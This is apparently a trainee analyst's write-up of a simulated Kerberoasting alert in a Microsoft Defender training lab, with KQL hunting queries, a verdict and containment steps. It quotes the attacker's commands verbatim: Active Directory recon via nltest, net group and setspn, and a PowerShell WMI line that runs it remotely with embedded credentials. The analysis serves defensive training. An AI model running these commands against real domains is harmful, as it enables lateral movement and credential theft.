`powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; & 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8839.16604910.0.16604910-4b4c32cf9e4fab087b95ca20bf2b98182024a400\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }"`


![[Pasted image 20260915123721.png]]

![[Pasted image 20260915123755.png]]

Checking which users executed the setspn.exe from that date range.​

![[Pasted image 20260915124512.png]]
The excuted commands used at command prompt

![[Pasted image 20260915124601.png]]

`cmd.exe /c (nltest /dclist:socsim.local & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\Temp\recon.txt 2>&1`

Attacks used this PowerShell script 

`powershell.exe -ExecutionPolicy Bypass -C "$sec=ConvertTo-SecureString '*********' -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential('SOCSIM\dave.brown',$sec); Invoke-WmiMethod -ComputerName SOCSIM-SRV02 -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c (nltest /dclist:socsim.local & net group \"Domain Admins\" /domain & net group \"Domain Controllers\" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\Temp\recon.txt 2>&1'"`

![[Pasted image 20260915124616.png]]

"setspn.exe" -a MSSQLSvc/SOCSIM-DC.socsim.local:1433 SOCSIM\svc_sql

![[Pasted image 20260915124655.png]]





![[Pasted image 20260915124916.png]]







Information on devices linked to this alert.


[socsim-srv01.socsim.local](https://security.microsoft.com/v2/advanced-hunting?tid=567ea528-4e82-40fa-914e-38c05fd69677#)


![[Pasted image 20260915114949.png]]



dclist:socsim.local

`cmd.exe /c (nltest /dclist:socsim.local & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\Temp\recon.txt 2>&1`



![[Pasted image 20260915130648.png]]






---





![[Pasted image 20260915131159.png]]




![[Pasted image 20260915144911.png]]![[Pasted image 20260915150530.png]]
### Was the [[]]activity successful?
- [x] Yes
- [ ] No
- [ ] Unknown

### Verdict
- [x] **Malicious**
- [ ] **Non-malicious**
- [x] **Suspicious — requires further investigation**

**Justification:**
<!-- Why did you reach this conclusion? Be specific. -->

The High-severity alert "Potential Kerberoasting activity" fired on socsim-srv01 (172.31.6.234). It fired when `cmd.exe`, running as SYSTEM, started `setspn -Q */*` as part of this command:

```
"cmd.EXE" /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
```

- **What it collected:** In one line, the command listed the domain controllers, the members of Domain Admins and Domain Controllers, every SPN in the domain and the domain password policy. All of it was saved to a file in the Temp folder.
- **It ran three times:** 25/8 at 22:55 and 23:20, and 26/8 at 00:52. The child processes were created each time, so Defender detected the commands but didn't block them.
- **Service tickets were requested:** 58 seconds after the last run, SYSTEM ran the hidden script `svcupd.ps1` with `-ExecutionPolicy Bypass`. PowerShell content captured in the timeline calls `KerberosRequestorSecurityToken` on each SPN, which requests a Kerberos service ticket. It logs the results to `C:\Windows\Temp\svccache\tickets.txt`, the same folder the script is in.
- **Wider activity:** The same recon command was run as dave.brown on 1 Sep. One second before that, SYSTEM used `Invoke-WmiMethod` to launch it on SOCSIM-SRV02.

This matches T1558.003 (Kerberoasting): first list the SPNs, then request service tickets for them.

--- 

## 3. Investigation Steps

<!-- Walk through your process in order. What did you look at first? What led you to each pivot? -->

1. Process and Alert timeline - started with the triggers
2. Gathering all my notes and just gather as much as I can on executed commands used by the attacker 
3. KQL onsetspn.exe that associated users, device names and IP addresses

### Queries Used

```kql
// Paste queries here

AlertEvidence
| where AlertId == "da1712631f-3404-43b0-8e5f-9e7ce03198d6_1"

DeviceProcessEvents
| where DeviceName == "socsim-srv01.socsim.local"
| where Timestamp > datetime(2026-08-25T10:48:06Z)
| project Timestamp, AccountName, FileName, ProcessCommandLine,
 InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc

DeviceProcessEvents
| where Timestamp > datetime(2026-08-25T10:48:06Z)
| where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
| project AccountName, FileName, ProcessCommandLine

DeviceProcessEvents
| where Timestamp > datetime(2026-08-25T10:48:06Z)
| where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
| project AccountName, FileName, ProcessCommandLine, Timestamp

| where Timestamp > datetime(2026-08-25T10:48:06Z)
| where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
| where DeviceName contains "SOCSIM-DC.socsim.locaL"
| project AccountName, FileName, ProcessCommandLine, Timestamp


`AlertEvidence`
`| where AlertId == "da1712631f-3404-43b0-8e5f-9e7ce03198d6_1"`
`| where isnotempty(ProcessCommandLine)`
`| project Timestamp, DeviceName, AccountName, ProcessCommandLine`

DeviceProcessEvents
| where Timestamp > datetime(2026-08-25T10:48:06Z)
| where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
| distinct DeviceName, DeviceId

DeviceProcessEvents
| where Timestamp > datetime(2026-08-25T10:48:06Z)=
| where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
| distinct DeviceName, DeviceId

DeviceFileEvents
| where Timestamp > datetime(2026-08-25T10:48:06Z)
| where FolderPath has "recon.txt" or FileName =~ "recon.txt"
| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine

let SetspnDevices =
    DeviceProcessEvents
    | where Timestamp > datetime(2026-08-25T10:48:06Z)
    | where FileName =~ "setspn.exe" or ProcessCommandLine has "setspn"
    | distinct DeviceName;
DeviceNetworkInfo
| where DeviceName in (SetspnDevices)
| summarize arg_max(Timestamp, *) by DeviceName, MacAddress
| mv-expand parse_json(IPAddresses)
| extend IPAddress = tostring(IPAddresses.IPAddress)
| where IPAddress != "127.0.0.1" and IPAddress !startswith "fe80"
| project Timestamp, DeviceName, MacAddress, IPAddress, NetworkAdapterType,

let MyAlert = "da1712631f-3404-43b0-8e5f-9e7ce03198d6_1";
let MyAccounts =
    AlertEvidence
    | where AlertId == MyAlert
    | where isnotempty(AccountName)
    | distinct AccountName;
AlertEvidence
| where AccountName in (MyAccounts)
| where AlertId != MyAlert
| distinct AlertId, AccountName
| join kind=inner AlertInfo on AlertId
| project Timestamp, AlertId, Title, Severity, Category, AccountName
| sort by Timestamp asc
```

---

## 4. Categorisation

- [x] ✅ **True Positive** — malicious activity confirmed
- [ ] ⚠️ **Benign True Positive** — alert fired correctly, activity is legitimate
- [ ] ❌ **False Positive** — alert fired incorrectly, rule needs review

---

## 5. Recommended Actions

**Escalation:**
- [x] Urgent — phone call required
- [ ] Non-urgent — email sufficient
- [ ] No escalation required

**Containment / Next Steps:**
<!-- What should happen next? Free text — don't limit yourself to a checklist. -->
Based on the alert notes recommendations:

## A. Check if the alert is real
1. Find the program that caused the alert. Look at which program started it and what it was doing.
2. Ask the person who owns the computer if they expected this activity.
3. Check the files: how common they are, where they are saved, and whether they have a trusted digital signature.
4. Look at what else happened on the computer around the time of the alert.
5. Send any important files for a deeper scan and see what they do.

## B. Find out how big the problem is
1. Look for other alerts or activity on the same computer. Check the incident graph to see if they are part of a bigger attack.
2. Look for programs that shouldn't be running. Check any suspicious files (how common they are, where they are saved, and whether they are signed) and send them for a deeper scan.
3. See what other computers, IP addresses and websites this computer has been talking to. Ask the owners about anything unusual, and check whether the websites are known to be safe or dangerous.

## C. Stop the attack and limit the damage
1. If any affected computer is doing something it shouldn't, cut it off from the network so the attack can't spread.
2. Stop any suspicious programs.
3. Turn off hacked accounts or change their passwords.
4. Block the bad IP addresses and websites.
5. Install the latest security updates.

## D. Get help
Contact your incident response team or Microsoft support to help investigate and fix the problem.

**Alert Tuning:**
- [x] Tune recommended —
- [ ] No tuning required

---

## 6. Lessons Learned

<!-- What would you do differently? Where did you go wrong or take a longer path than needed?
     This is the most valuable part of the write-up for your own growth and for anyone reading your portfolio. -->
 - The overwhelming of logs overloaded my brain on where to look at. Once i practice in SOC analysing, its easy to find the right information  
 - Gathered as much random notes as I can without structure - It look me a long time to gather notes that require more practice
 - AI most of my KQL commands - also learning them as a go but would like to write it up manually one day
 - This alert was difficult as I'm based on evidence and assuming they cracked the file and stole Active director credentials
 - A process map would be easy for this alert - More like draw out a layout map to track the attacker
 - since this attacker is suspicious - we won't know for sure  
 - Keep practicing  with my mentor overtime 

---

<details>
<summary>📚 About this template</summary>

This investigation template is from the **[SOC Simulation Project](https://www.skool.com/socsim/about)** by WDLabs / WebDefend Cyber Security — a hands-on training environment giving aspiring analysts access to Microsoft Defender for Endpoint and Microsoft Sentinel to investigate real alerts generated by emulated threat actor TTPs.

</details>
